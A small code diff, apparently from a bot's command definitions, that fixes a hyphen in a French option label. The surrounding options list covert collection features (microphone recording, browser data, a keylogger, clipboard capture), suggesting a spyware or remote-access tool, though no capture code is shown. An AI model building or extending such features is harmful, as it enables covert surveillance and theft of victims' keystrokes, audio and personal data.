@@ -106,7 +106,7 @@ export const commands = [
                     { name: 'Enregistrements audio', value: 'microphone' },
                     { name: 'Données de navigation', value: 'browserdata' },
                     { name: 'Enregistrements du clavier', value: 'keylogger' },
-                    { name: 'Récuperation presse-papier', value: 'papier' }
+                    { name: 'Récuperation presse papier', value: 'papier' }
                 ],
             },
             {
